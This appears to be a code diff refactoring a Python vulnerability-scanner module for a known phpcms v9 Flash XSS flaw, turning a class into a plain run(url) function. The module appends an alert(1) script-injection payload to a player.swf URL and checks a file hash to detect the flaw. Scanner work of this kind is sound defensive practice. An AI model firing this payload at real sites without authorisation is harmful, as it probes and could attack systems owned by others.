@@ -11,21 +11,14 @@ import urllib.request
 import hashlib
 import requests
 import warnings
-
-
-
-class v9_flash_xss:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['phpcms v9 flash xss漏洞','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         flash_md5 = "cf00b069e36e756705c49b3a3bf20c40"
         payload = "/statics/js/ckeditor/plugins/flashplayer/player/player.swf?skin=skin.swf&stream=\%22))}catch(e){alert(1)}//"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = urllib.request.urlopen(vulnurl)
             data = req.read()
@@ -42,5 +35,4 @@ class v9_flash_xss:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = v9_flash_xss(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
